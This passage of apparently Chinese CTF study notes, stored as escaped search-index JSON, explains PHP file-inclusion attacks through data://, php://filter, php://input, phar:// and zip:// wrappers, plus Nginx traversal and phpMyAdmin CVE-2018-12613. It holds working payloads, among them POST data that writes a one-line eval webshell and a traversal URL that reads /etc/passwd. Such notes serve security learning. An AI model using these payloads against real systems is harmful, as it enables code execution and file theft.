<pre><code>include()\nrequire()\ninclude_once()\nrequire_once()\ninclude\u4e0erequire\u57fa\u672c\u662f\u76f8\u540c\u7684\uff0c\u9664\u4e86\u9519\u8bef\u5904\u7406\u65b9\u9762:\ninclude()\uff0c\u53ea\u751f\u6210\u8b66\u544a\uff08E_WARNING\uff09\uff0c\u5e76\u4e14\u811a\u672c\u4f1a\u7ee7\u7eed\nrequire()\uff0c\u4f1a\u751f\u6210\u81f4\u547d\u9519\u8bef\uff08E_COMPILE_ERROR\uff09\u5e76\u505c\u6b62\u811a\u672c\ninclude_once()\u4e0erequire_once()\uff0c\u5982\u679c\u6587\u4ef6\u5df2\u5305\u542b\uff0c\u5219\u4e0d\u4f1a\u5305\u542b\uff0c\u5176\u4ed6\u7279\u6027\u5982\u4e0a\n</code></pre> <p>\u603b\u7684\u6765\u8bf4\u5c31\u662f\u7531\u4e8e\u670d\u52a1\u5668\u7aef\u914d\u7f6e\u4e0d\u5f53\u5bfc\u81f4\u670d\u52a1\u5668\u4e2d\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570\u53ef\u4ee5\u88ab\u5229\u7528</p>"},{"location":"web_bak/include/include_normal/#_5","title":"\u4f2a\u534f\u8bae","text":"<pre><code>ftp://shell.php\nfile:///tmp/shell.php\nhttp://xxxx/shell.php\n\\\\smbserver\\shell.php        //unc\u8def\u5f84\nphar://xxxx/x.zip/shell.php   //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nzip://xxxx/x.zip#shell.php    //\u9700\u5c06shell.php\u6253\u5305\u4e3ax.zip\u4e0a\u4f20\nphp://filter/read=convert.base64-encode/resource=shell.php\ncompress.bzip2://shell.php\ncompress.zlib://shell.jpg\nphp://input    [POST DATA] &lt;?php phpinfo()?&gt;\ndata://text/plain,&lt;?php phpinfo()?&gt;                 //\u4e5f\u53ef\u4ee5data:text/plain,&lt;?php phpinfo()?&gt;\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\nphp://filter/read=convert.base64-encode/resource=phar://phar.phar\nphp://filter/convert.base64-decode|convert.base64-decode/resource=shell.php\nphp://filter/%72ead=convert.base64-encode/resource=shell.%70hp\n</code></pre> <p>\u4e00\u5171\u6709\u8fd9\u4e48\u591a\u79cd\u5e38\u7528\u7684\uff0c\u518d\u52a0\u4e0a\u4e00\u4e9b\u975e\u5e38\u975e\u5e38\u795e\u5947\u7684\u64cd\u4f5c</p> <p>\u6162\u6162\u6765\u89e3\u91ca\uff1a</p>"},{"location":"web_bak/include/include_normal/#data","title":"data://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u81ea<code>PHP&gt;=5.2.0</code>\u8d77\uff0c\u53ef\u4ee5\u4f7f\u7528<code>data://</code>\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1adata://text/plain,data://text/plain;base64,</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>data://text/plain,\nhttp://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;\n</code></pre> <p></p> <pre><code>data://text/plain;base64,\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n</code></pre> <p></p>"},{"location":"web_bak/include/include_normal/#file","title":"file://\u4f2a\u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u7528\u4e8e\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff0c\u5728CTF\u4e2d\u901a\u5e38\u7528\u6765\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7684\u4e14\u4e0d\u53d7<code>allow_url_fopen</code>\u4e0e<code>allow_url_include</code>\u7684\u5f71\u54cd\u3002<code>include()/require()/include_once()/require_once()</code>\u53c2\u6570\u53ef\u63a7\u7684\u60c5\u51b5\u4e0b\uff0c\u5982\u5bfc\u5165\u4e3a\u975e<code>.php</code>\u6587\u4ef6\uff0c\u5219\u4ecd\u6309\u7167php\u8bed\u6cd5\u8fdb\u884c\u89e3\u6790\uff0c\u8fd9\u662f<code>include()</code>\u51fd\u6570\u6240\u51b3\u5b9a\u7684\u3002</p> </li> <li> <p>\u8bf4\u660e\uff1a<code>file://</code>\u6587\u4ef6\u7cfb\u7edf\u662f PHP \u4f7f\u7528\u7684\u9ed8\u8ba4\u5c01\u88c5\u534f\u8bae\uff0c\u5c55\u73b0\u4e86\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u3002\u5f53\u6307\u5b9a\u4e86\u4e00\u4e2a\u76f8\u5bf9\u8def\u5f84\uff08\u4e0d\u4ee5/\u3001\u3001\\\u6216 Windows \u76d8\u7b26\u5f00\u5934\u7684\u8def\u5f84\uff09\u63d0\u4f9b\u7684\u8def\u5f84\u5c06\u57fa\u4e8e\u5f53\u524d\u7684\u5de5\u4f5c\u76ee\u5f55\u3002\u5728\u5f88\u591a\u60c5\u51b5\u4e0b\u662f\u811a\u672c\u6240\u5728\u7684\u76ee\u5f55\uff0c\u9664\u975e\u88ab\u4fee\u6539\u4e86\u3002\u4f7f\u7528 CLI \u7684\u65f6\u5019\uff0c\u76ee\u5f55\u9ed8\u8ba4\u662f\u811a\u672c\u88ab\u8c03\u7528\u65f6\u6240\u5728\u7684\u76ee\u5f55\u3002\u5728\u67d0\u4e9b\u51fd\u6570\u91cc\uff0c\u4f8b\u5982<code>fopen()</code>\u548c<code>file_get_contents()</code>\uff0c<code>include_path</code>\u4f1a\u53ef\u9009\u5730\u641c\u7d22\uff0c\u4e5f\u4f5c\u4e3a\u76f8\u5bf9\u7684\u8def\u5f84\u3002</p> </li> <li> <p>\u7528\u6cd5\uff1a/path/to/file.extrelative/path/to/file.extfileInCwd.extC:/path/to/winfile.extC:\\path\\to\\winfile.ext\\smbserver\\share\\path\\to\\winfile.extfile:///path/to/file.ext</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> <li></li> </ul> <pre><code>file://[\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n</code></pre> <p></p> <pre><code>[\u6587\u4ef6\u7684\u76f8\u5bf9\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=./phpinfo.txt\n</code></pre> <p></p> <pre><code>[http\uff1a//\u7f51\u7edc\u8def\u5f84\u548c\u6587\u4ef6\u540d]http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n</code></pre> <p></p>"},{"location":"web_bak/include/include_normal/#local_file","title":"local_file\u4f2a\u534f\u8bae","text":"<p>\u4e5f\u6709\u65f6\u5019\u5229\u7528local_file\u6765\u7ed5\u8fc7\uff0c\u67e5\u4e86\u4e00\u4e0b\u597d\u50cf\u8fd8\u662f\u4e2acve.</p> <p>\u987a\u5e26\u4e00\u63d0\uff0cflask\u6e90\u7801\u653e\u5728/app/app.py\u4e4b\u4e2d</p> <p>local_file:///sys/class/net/eth0/address:\u8bfb\u53d6MAC\u5730\u5740</p>"},{"location":"web_bak/include/include_normal/#gopher","title":"gopher://\u4f2a\u534f\u8bae","text":"<p>Gopher\u662f\u4e00\u79cd\u5206\u5e03\u5f0f\u6587\u6863\u4f20\u9012\u670d\u52a1\u3002\u5229\u7528\u8be5\u670d\u52a1\uff0c\u7528\u6237\u53ef\u4ee5\u65e0\u7f1d\u5730\u6d4f\u89c8\u3001\u641c\u7d22\u548c\u68c0\u7d22\u9a7b\u7559\u5728\u4e0d\u540c\u4f4d\u7f6e\u7684\u4fe1\u606f\u3002</p> <pre><code>gopher://127.0.0.1:1337/_Hi%0Assrf%0Atest\n</code></pre> <p>\u8fd9\u4e2a\u5728ssrf\u4e2d\u4f1a\u91cd\u70b9\u4ecb\u7ecd</p>"},{"location":"web_bak/include/include_normal/#http-https","title":"http:// &amp; https:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:on</p> </li> <li> <p><code>allow_url_include</code>:on</p> </li> <li> <p>\u4f5c\u7528\uff1a\u5e38\u89c4 URL \u5f62\u5f0f\uff0c\u5141\u8bb8\u901a\u8fc7<code>HTTP 1.0</code>\u7684 GET\u65b9\u6cd5\uff0c\u4ee5\u53ea\u8bfb\u8bbf\u95ee\u6587\u4ef6\u6216\u8d44\u6e90\u3002CTF\u4e2d\u901a\u5e38\u7528\u4e8e\u8fdc\u7a0b\u5305\u542b\u3002</p> </li> <li></li> </ul> <pre><code>\u7528\u6cd5\uff1ahttp://example.comhttp://example.com/file.php?var1=val1&amp;var2=val2http://user:password@example.comhttps://example.comhttps://example.com/file.php?var1=val1&amp;var2=val2https://user:password@example.com\n</code></pre> <p>\u793a\u4f8b\uff1a</p> <pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt\n</code></pre> <p></p>"},{"location":"web_bak/include/include_normal/#phar","title":"phar://\u4f2a\u534f\u8bae","text":"<pre><code>phar://\u534f\u8bae\u4e0ezip://\u7c7b\u4f3c\uff0c\u540c\u6837\u53ef\u4ee5\u8bbf\u95eezip\u683c\u5f0f\u538b\u7f29\u5305\u5185\u5bb9\uff0c\u5728\u8fd9\u91cc\u53ea\u7ed9\u51fa\u4e00\u4e2a\u793a\u4f8b\uff1a\n</code></pre> <pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n</code></pre>"},{"location":"web_bak/include/include_normal/#_6","title":"\u6587\u4ef6\u5305\u542b","text":"<p>\u4e0b\u9762\u662f\u6211\u81ea\u5df1\u7684\u603b\u7ed3\uff1a</p> <p>\u8fd9\u91cc\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0bphar\uff0c\u7c7b\u4f3cjava\u4e2d\u7684jar\uff0cphar\u662f\u4e00\u4e2a\u5408\u6210\u8bcd\uff0c\u7531PHP \u548c Archive\u6784\u6210\uff0c\u53ef\u4ee5\u770b\u51fa\u5b83\u662fphp\u5f52\u6863\u6587\u4ef6\u7684\u610f\u601d\u3002phar\u5f52\u6863\u6587\u4ef6\u6709\u4e09\u79cd\u683c\u5f0f\uff1atar\u5f52\u6863\u3001zip\u5f52\u6863\u3001phar\u5f52\u6863\uff0c\u524d\u4e24\u79cd\u6267\u884c\u9700\u8981php\u5b89\u88c5Phar \u6269\u5c55\u652f\u6301\uff0c\u7528\u7684\u4e5f\u6bd4\u8f83\u5c11\uff0c\u8fd9\u91cc\u4e3b\u8981\u8bb2phar\u5f52\u6863\u683c\u5f0f\u3002</p> <p>phar\u683c\u5f0f\u5f52\u6863\u6587\u4ef6\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\uff0c\u5b83\u7684\u4ea7\u751f\u4f9d\u8d56\u4e8ePhar\u6269\u5c55\uff0c\u7531\u81ea\u5df1\u7f16\u5199\u7684php\u811a\u672c\u4ea7\u751f\u3002\u4e5f\u662f\u4e00\u79cd\u6d41\u5305\u88c5\u5668\u3002</p> <pre><code>&lt;?php\n    class User {\n        public $db;\n    } \n    class File{\n        public $filename;\n        public function __construct($name){\n            $this-&gt;filename=$name;\n        }\n    }\n    class FileList {\n        private $files;\n        public function __construct(){\n            $this-&gt;files=array(new File('/flag.txt'));\n        }\n    } //\u4e0a\u9762\u662f\u53cd\u5e8f\u5217\u5316\uff0c\u5b9e\u9645\u7528\u4e0b\u6765\u6a21\u677f\u4e00\u70b9\u70b9\u7684\u4e1c\u897f\u5728\u4e0b\u9762\n    $o = new User();\n    $o-&gt;db =new FileList();\n    @unlink(\"phar.phar\");//\u5220\u9664\u4e4b\u524d\u7684test.par\u6587\u4ef6(\u5982\u679c\u6709)\n    $phar = new Phar(\"phar.phar\");//\u521b\u5efa\u4e00\u4e2aphar\u5bf9\u8c61\uff0c\u6587\u4ef6\u540d\u5fc5\u987b\u4ee5phar\u4e3a\u540e\u7f00\n    $phar-&gt;startBuffering();//\u5f00\u59cb\u5199\u6587\u4ef6\n    $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\");//\u5199\u5165stub\n    $phar-&gt;setMetadata($o);//\u5199\u5165meta-data\n    $phar-&gt;addFromString(\"test.txt\", \"test\"); //\u6dfb\u52a0\u8981\u538b\u7f29\u7684\u6587\u4ef6\n    $phar-&gt;stopBuffering();\n?&gt;\n</code></pre> <p>\u719f\u6089\u7684\u8bdd\u5e94\u8be5\u80fd\u770b\u51fa\u8fd9\u4e2a\u662f\u4e00\u4e2a\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\uff0c\u4f46\u5b83\u8ddfphar\u4f2a\u534f\u8bae\u6709\u6709\u4ec0\u4e48\u8054\u7cfb\u5462\uff1f</p> <p>\uff08\u5176\u5b9e\u662f\u548c\u53cd\u5e8f\u5217\u5316\u6d89\u53ca\u5230\u7684\u6587\u4ef6\u5305\u542b\uff09</p> <p>\u867d\u7136\u6bd4\u8f83\u7279\u4f8b\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u6a21\u677f\u4e86\uff0c\u5229\u7528\u65b9\u5f0f\u4f1a\u4e0e\u6587\u4ef6\u4e0a\u4f20\u4e00\u8d77\uff0c\u7136\u540e\u5229\u7528phar://\u4f2a\u534f\u8bae\u6765\u8bbf\u95ee\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u3002</p> <p>\u987a\u5e26\u4e00\u63d0\u5c31\u662f\u5728\u4f7f\u7528phar\u4ee3\u7801\u65f6\uff0c\u8981\u628aphp.ini\u6587\u4ef6\u4e2d\u7684phar.readonly \u8bbe\u7f6e\u4e3aOFF.</p> <p>\u7a0d\u5fae\u5177\u4f53\u70b9\u4ecb\u7ecd\uff1a</p> <pre><code>stub\nphar \u6587\u4ef6\u6807\u8bc6\uff0c\u683c\u5f0f\u4e3a xxx&lt;?php xxx; __HALT_COMPILER();?&gt;\uff1b\nmanifest\n\u538b\u7f29\u6587\u4ef6\u7684\u5c5e\u6027\u7b49\u4fe1\u606f\uff0c\u4ee5/*\u5e8f\u5217\u5316*/\u5b58\u50a8\uff1b\ncontents\n\u538b\u7f29\u6587\u4ef6\u7684\u5185\u5bb9\uff1b\nsignature\n\u7b7e\u540d\uff0c\u653e\u5728\u6587\u4ef6\u672b\u5c3e\uff1b\u8fd9\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u70b9\uff0c\u4e00\u662f\u6587\u4ef6\u6807\u8bc6\uff0c\u5fc5\u987b\u4ee5__HALT_COMPILER();?&gt;\u7ed3\u5c3e\uff0c\u4f46\u524d\u9762\u7684\u5185\u5bb9\u6ca1\u6709\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u53ef\u4ee5\u8f7b\u6613\u4f2a\u9020\u4e00\u4e2a\u56fe\u7247\u6587\u4ef6\u6216\u8005pdf\u6587\u4ef6\u6765\u7ed5\u8fc7\u4e00\u4e9b\u4e0a\u4f20\u9650\u5236\uff1b\u4e8c\u662f\u53cd\u5e8f\u5217\u5316\uff0cphar\u5b58\u50a8\u7684meta-data\u4fe1\u606f\u4ee5\u5e8f\u5217\u5316\u65b9\u5f0f\u5b58\u50a8\uff0c\u5f53\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u901a\u8fc7phar://\u4f2a\u534f\u8bae\u89e3\u6790phar\u6587\u4ef6\u65f6\u5c31\u4f1a\u5c06\u6570\u636e\u53cd\u5e8f\u5217\u5316\uff0c\u800c\u8fd9\u6837\u7684\u6587\u4ef6\u64cd\u4f5c\u51fd\u6570\u6709\u5f88\u591a\u3002\n</code></pre> <p>\u4f8b\u9898\uff1a</p> <p>[CISCN2019 \u534e\u5317\u8d5b\u533a Day1 Web1]Dropbox</p>"},{"location":"web_bak/include/include_normal/#php","title":"php://\u4f2a\u534f\u8bae","text":"<p>php://input,\u7528\u4e8e\u6267\u884cphp\u4ee3\u7801\uff0c\u9700\u8981post\u8bf7\u6c42\u63d0\u4ea4\u6570\u636e\u3002</p>"},{"location":"web_bak/include/include_normal/#phpfilter","title":"php://filter","text":"<p>php://filter\u662f\u4e00\u79cd\u5143\u5c01\u88c5\u5668\uff0c\u7528\u4e8e\u6570\u636e\u6d41\u6253\u5f00\u65f6\u7b5b\u9009\u8fc7\u6ee4\u5e94\u7528\u3002\u8fd9\u5bf9\u4e8e\u4e00\u4f53\u5f0f\uff08all-in-one\uff09\u7684\u6587\u4ef6\u51fd\u6570\u975e\u5e38\u6709\u7528\u3002\u7c7b\u4f3creadfile()\u3001file()\u3001file_get_contents(),\u5728\u6570\u636e\u6d41\u8bfb\u53d6\u4e4b\u524d\u6ca1\u6709\u673a\u4f1a\u4f7f\u7528\u5176\u4ed6\u8fc7\u6ee4\u5668\u3002</p> <p>\u7528\u4e8e\u8bfb\u53d6\u6e90\u7801\uff0cget\u63d0\u4ea4\u53c2\u6570\u3002a=php://filter/read=convert.base64/resource=xxx.php</p> <p>\u9700\u8981\u5f00\u542fallow_url_fopen:php://input\u3001php://stdin\u3001php://memory\u3001php://temp</p> <p>\u4e0d\u9700\u8981\u5f00\u542fallow_url_fopen:php://filter</p> <p>php://filter\u53c2\u6570</p> <p>\u540d\u79f0  \u63cf\u8ff0</p> <p>resource=&lt;\u8981\u8fc7\u6ee4\u7684\u6570\u636e\u6d41&gt;  \u8fd9\u4e2a\u53c2\u6570\u662f\u5fc5\u987b\u7684\u3002\u5b83\u6307\u5b9a\u4e86\u4f60\u8981\u7b5b\u9009\u8fc7\u6ee4\u7684\u6570\u636e\u6d41\u3002</p> <p>read=&lt;\u8bfb\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt;  \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>write=&lt;\u5199\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u8be5\u53c2\u6570\u53ef\u9009\u3002\u53ef\u4ee5\u8bbe\u5b9a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fc7\u6ee4\u5668\u540d\u79f0\uff0c\u4ee5\u7ba1\u9053\u7b26(</p> <p>&lt;\uff1b\u4e24\u4e2a\u94fe\u7684\u7b5b\u9009\u5217\u8868&gt; \u4efb\u4f55\u6ca1\u6709\u4ee5 read= \u6216 write= \u4f5c\u524d\u7f00 \u7684\u7b5b\u9009\u5668\u5217\u8868\u4f1a\u89c6\u60c5\u51b5\u5e94\u7528\u4e8e\u8bfb\u6216\u5199\u94fe\u3002</p> <p>\u9996\u5148\u8fd9\u662f\u4e00\u4e2afile\u5173\u952e\u5b57\u7684get\u53c2\u6570\u4f20\u9012\uff0cphp://\u662f\u4e00\u79cd\u534f\u8bae\u540d\u79f0\uff0cphp://filter/\u662f\u4e00\u79cd\u8bbf\u95ee\u672c\u5730\u6587\u4ef6\u7684\u534f\u8bae\uff0c/read=convert.base64-encode/\u8868\u793a\u8bfb\u53d6\u7684\u65b9\u5f0f\u662fbase64\u7f16\u7801\u540e\uff0cresource=index.php\u8868\u793a\u76ee\u6807\u6587\u4ef6\u4e3aindex.php\u3002</p> <p>\u901a\u8fc7\u4f20\u9012\u8fd9\u4e2a\u53c2\u6570\u53ef\u4ee5\u5f97\u5230index.php\u7684\u6e90\u7801\uff0c\u4e0b\u9762\u8bf4\u8bf4\u4e3a\u4ec0\u4e48\uff0c\u770b\u5230\u6e90\u7801\u4e2d\u7684include\u51fd\u6570\uff0c\u8fd9\u4e2a\u8868\u793a\u4ece\u5916\u90e8\u5f15\u5165php\u6587\u4ef6\u5e76\u6267\u884c\uff0c\u5982\u679c\u6267\u884c\u4e0d\u6210\u529f\uff0c\u5c31\u8fd4\u56de\u6587\u4ef6\u7684\u6e90\u7801\u3002</p> <p>\u800cinclude\u7684\u5185\u5bb9\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\uff0c\u6240\u4ee5\u901a\u8fc7\u6211\u4eec\u4f20\u9012\u7684file\u53c2\u6570\uff0c\u662finclude\uff08\uff09\u51fd\u6570\u5f15\u5165\u4e86index.php\u7684base64\u7f16\u7801\u683c\u5f0f\uff0c\u56e0\u4e3a\u662fbase64\u7f16\u7801\u683c\u5f0f\uff0c\u6240\u4ee5\u6267\u884c\u4e0d\u6210\u529f\uff0c\u8fd4\u56de\u6e90\u7801\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u5230\u4e86\u6e90\u7801\u7684base64\u683c\u5f0f\uff0c\u89e3\u7801\u5373\u53ef\u3002</p> <p>\u5982\u679c\u4e0d\u8fdb\u884cbase64\u7f16\u7801\u4f20\u5165\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\uff0c\u800cflag\u7684\u4fe1\u606f\u5728\u6ce8\u91ca\u4e2d\uff0c\u662f\u5f97\u4e0d\u5230\u7684\u3002</p>"},{"location":"web_bak/include/include_normal/#_7","title":"\u793a\u4f8b\uff1a","text":"<pre><code>php://filter/read=convert.base64-encode/resource=[\u6587\u4ef6\u540d]\u8bfb\u53d6\u6587\u4ef6\u6e90\u7801\uff08\u9488\u5bf9php\u6587\u4ef6\u9700\u8981base64\u7f16\u7801\uff09http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php\n</code></pre> <pre><code>php://input + [POST DATA]\u6267\u884cphp\u4ee3\u7801http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php phpinfo(); ?&gt;\n</code></pre> <p>\u82e5\u6709\u5199\u5165\u6743\u9650\uff0c\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c</p> <pre><code>http://127.0.0.1/include.php?file=php://input[POST DATA\u90e8\u5206]&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;\n</code></pre> <p></p> <p>\u603b\u4e4b\u5c31\u4e00\u4e2a\u4ee3\u7801\u6267\u884c\uff0c\u4e00\u4e2a\u5229\u7528\u6570\u636e\u6d41\u8bfb\u53d6\u6e90\u4ee3\u7801</p> <p>#####################################################################</p> <p>\u5173\u4e8efile_put_contents\u7684\u4e00\u4e9b\u5c0f\u6d4b\u8bd5</p> <p>\u6628\u5929\u770b\u4e86\u7bc7\u6587\u7ae0\u4e00\u6b21\u201cSSRF\u2013&gt;RCE\u201d\u7684\u8270\u96be\u5229\u7528\uff0c\u88ab\u91cc\u9762\u7684\u5404\u79cd\u9a9a\u64cd\u4f5c\u7ed9\u79c0\u5230\u4e86\uff0c\u53d1\u73b0file_put_contents\u8fd9\u4e2a\u5f88\u6709\u610f\u601d\uff0c\u7ed5\u8fc7&lt;?php exit();GetShell\u4e5f\u7ecf\u5e38\u6709\u4eba\u63d0\u51fa\u4e0d\u540c\u7684\u601d\u8def\uff0c\u8fd9\u91cc\u7b80\u5355\u7684\u505a\u4e00\u4e0b\u6d4b\u8bd5\u548c\u8bb0\u5f55\u3002 file_put_contents(filename,\u201d&lt;?php exit();\u201d.content);</p> <p>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</p>"},{"location":"web_bak/include/include_normal/#zip-bzip2-zlib","title":"zip:// &amp; bzip2:// &amp; zlib:// \u534f\u8bae","text":"<p>\u6761\u4ef6\uff1a</p> <ul> <li> <p><code>allow_url_fopen</code>:off/on</p> </li> <li> <p><code>allow_url_include</code>:off/on</p> </li> <li> <p>\u4f5c\u7528\uff1a<code>zip:// &amp; bzip2:// &amp; zlib://</code>\u5747\u5c5e\u4e8e\u538b\u7f29\u6d41\uff0c\u53ef\u4ee5\u8bbf\u95ee\u538b\u7f29\u6587\u4ef6\u4e2d\u7684\u5b50\u6587\u4ef6\uff0c\u66f4\u91cd\u8981\u7684\u662f\u4e0d\u9700\u8981\u6307\u5b9a\u540e\u7f00\u540d\uff0c\u53ef\u4fee\u6539\u4e3a\u4efb\u610f\u540e\u7f00\uff1a<code>jpg png gif xxx</code>\u7b49\u7b49\u3002</p> </li> <li> <p>\u793a\u4f8b\uff1a</p> </li> </ul> <pre><code>zip://[\u538b\u7f29\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84]%23[\u538b\u7f29\u6587\u4ef6\u5185\u7684\u5b50\u6587\u4ef6\u540d]\uff08#\u7f16\u7801\u4e3a%23\uff09\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.zip \uff0c\u538b\u7f29\u5305\u91cd\u547d\u540d\u4e3a phpinfo.jpg \uff0c\u5e76\u4e0a\u4f20http://127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt\n</code></pre> <p></p> <pre><code>compress.bzip2://file.bz2\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.bz2 \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2\n</code></pre> <p></p> <pre><code>compress.zlib://file.gz\n\u538b\u7f29 phpinfo.txt \u4e3a phpinfo.gz \u5e76\u4e0a\u4f20\uff08\u540c\u6837\u652f\u6301\u4efb\u610f\u540e\u7f00\u540d\uff09\nhttp://127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz\n</code></pre> <p></p>"},{"location":"web_bak/include/include_pro/","title":"include\u8fdb\u9636","text":""},{"location":"web_bak/include/include_pro/#nginx","title":"Nginx\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e","text":"<p>Nginx (engine x) \u662f\u4e00\u4e2a\u9ad8\u6027\u80fd\u7684HTTP\u548c\u53cd\u5411\u4ee3\u7406\u670d\u52a1\u5668\uff0c\u4e5f\u662f\u4e00\u4e2aIMAP/POP3/SMTP\u670d\u52a1\u5668\u3002Nginx\u7ecf\u5e38\u88ab\u505a\u4e3a\u53cd\u5411\u4ee3\u7406\uff0c\u52a8\u6001\u7684\u90e8\u5206\u88abproxy_pass\u4f20\u9012\u7ed9\u540e\u7aef\u7aef\u53e3\uff0c\u800c\u9759\u6001\u6587\u4ef6\u9700\u8981Nginx\u6765\u5904\u7406\u3002</p> <p>payload\u5982\u4e0b</p> <pre><code>upload/../../../../../tmp/shell.php\n</code></pre> <p>\u81f3\u4e8e\u539f\u7406\uff0c\u770b\u770b\u5c31\u80fd\u5f88\u5feb\u7406\u89e3\uff1a</p> <p>NGINX-\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e_\u662f\u5927\u65b9\u5b50-CSDN\u535a\u5ba2_\u76ee\u5f55\u7a7f\u8d8a\u6f0f\u6d1e</p> <p>\u590d\u73b0\u73af\u5883centos7dockervulhub\uff08git\uff09\u590d\u73b0\u8fc7\u7a0b\u8fdb\u5165/root/vulhub/nginx/insecure-configuration\u76ee\u5f55\u8f93\u5165docker compose up -d \u5f00\u542f\u5bb9\u5668\u8bbf\u95ee\u4e0bfiles\u5728files\u540e\u9762\u52a0\u4e0a..\u53ef\u7a7f\u8d8a\u5230\u4e0a\u7ea7\u76ee\u5f55\u5bfc\u81f4\u6f0f\u6d1e\u7684\u539f\u56e0\uff0curl\u4e0a/files\u6ca1\u6709\u52a0\u540e\u7f00/\uff0c\u800cali...</p> <p>https://blog.csdn.net/nzjdsds/article/details/97624122</p>"},{"location":"web_bak/include/include_pro/#cve-2018-12613","title":"\u6587\u4ef6\u5305\u542b\u6f0f\u6d1eCVE-2018-12613","text":"<p>\u8fd9\u4e2a\u6211\u4e5f\u76f4\u63a5copy\u4e0b\u6765\u4e86\uff0c\u6211\u6ca1\u9047\u89c1\u8fc7\uff0c\u590d\u73b0\u7684\u8bdd\u65f6\u95f4\u4e0d\u592a\u591f\u3002</p> <p>phpMyAdmin 4.8.1 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff08CVE-2018-12613\uff09_GGyao\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>0x01 \u7b80\u4ecbphpMyadmin 4.8.1\u7248\u672c\u7684index.php\u4e2d\u5b58\u5728\u6587\u4ef6\u5305\u542b\u6f0f\u6d1e\uff0c\u901a\u8fc7\u4e8c\u6b21\u7f16\u7801\u53ef\u7ed5\u8fc7\u8fc7\u6ee4\u30020x02 \u6f0f\u6d1e\u590d\u73b01.\u5c06?\u8fdb\u884c\u4e24\u6b21URL\u7f16\u7801\u4e3a&amp;quot;%253f&amp;quot;\uff0c\u6784\u9020\u4e0b\u5217payload\uff1ahttp://xxx:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd\u6f0f\u6d1e\u5b58\u5728\u30022.\u5728S...</p> <p>https://blog.csdn.net/lhh134/article/details/86539066</p> <p>phpMyadmin 